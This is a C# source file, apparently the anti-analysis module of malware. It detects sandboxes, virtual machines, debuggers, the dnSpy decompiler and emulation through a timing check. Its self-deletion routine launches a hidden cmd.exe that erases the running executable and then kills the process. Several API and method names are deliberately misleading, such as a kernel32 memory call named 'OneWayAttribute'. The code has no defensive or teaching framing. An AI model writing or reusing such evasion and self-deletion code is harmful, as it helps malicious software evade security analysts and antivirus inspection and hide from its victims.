using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace Nokae.DebugProtector
{
    internal static class MainModule
    {
        [DllImport("kernel32", EntryPoint = "SetProcessWorkingSetSize")]
        private static extern int OneWayAttribute([In] IntPtr obj0, [In] int obj1, [In] int obj2);

        internal static bool IsSandboxie()
        {
            return Sandboxie.IsSandboxie();
        }

        internal static bool IsVM()
        {
            return CommonAcl.SecurityDocumentElement();
        }

        internal static bool IsDebugger()
        {
            return DebuggerAcl.Run();
        }

        internal static bool IsdnSpyRun()
        {
            return DnSpy.ValueType();
        }

        internal static bool IsEmulation()
        {
            var millisecondsTimeout = new Random().Next(3000, 10000);
            var now = DateTime.Now;
            Thread.Sleep(millisecondsTimeout);
            if ((DateTime.Now - now).TotalMilliseconds >= millisecondsTimeout)
                return false;
            return true;
        }

        internal static void SelfDelete()
        {
            Process.Start(new ProcessStartInfo("cmd.exe",
                    "/C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"" +
                    Assembly.GetExecutingAssembly().Location + "\"")
                {
                    WindowStyle = ProcessWindowStyle.Hidden
                })
                ?.Dispose();

            Process.GetCurrentProcess().Kill();
        }

        private static void WellKnownSidType()
        {
            var handle = Process.GetCurrentProcess().Handle;
            while (true)
            {
                do
                {
                    Thread.Sleep(16384);
                    GC.Collect();
                    GC.WaitForPendingFinalizers();
                } while (Environment.OSVersion.Platform != PlatformID.Win32NT);

                OneWayAttribute(handle, -1, -1);
            }
        }
    }
}